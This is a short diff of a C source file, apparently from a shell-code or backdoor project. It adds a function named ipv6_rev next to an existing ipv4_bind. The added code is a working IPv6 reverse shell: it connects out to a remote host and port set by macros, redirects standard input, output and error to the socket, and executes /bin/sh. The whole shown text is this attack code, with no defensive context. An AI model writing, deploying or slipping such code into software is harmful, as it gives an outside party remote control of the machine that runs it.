@@ -117,5 +117,35 @@ int ipv4_bind(void)
 }
 
 
+int ipv6_rev(void)
+{
+    const char* host=REM_HOST6;
+    struct sockaddr_in6 addr;
+    addr.sin6_family = AF_INET6;
+    addr.sin6_port = htons(REM_PORT);
+    inet_pton(AF_INET6, host, &addr.sin6_addr);
+
+    struct sockaddr_in6 client;
+    client.sin6_family = AF_INET6;
+    client.sin6_port = htons(LOC_PORT);
+    client.sin6_addr = in6addr_any;
+
+    int sockfd = socket(AF_INET6, SOCK_STREAM, 0);
+
+    bind(sockfd, (struct sockaddr*) &client, sizeof(client));
+    connect(sockfd, (struct sockaddr*) &addr, sizeof(addr));
+
+    for(int count=0; count < 3; count++)
+    {
+        dup2(sockfd, count);
+
+    }
+
+    execve("/bin/sh", NULL, NULL);
+    close(sockfd);
+
+    return 0;
+}
+
 
 
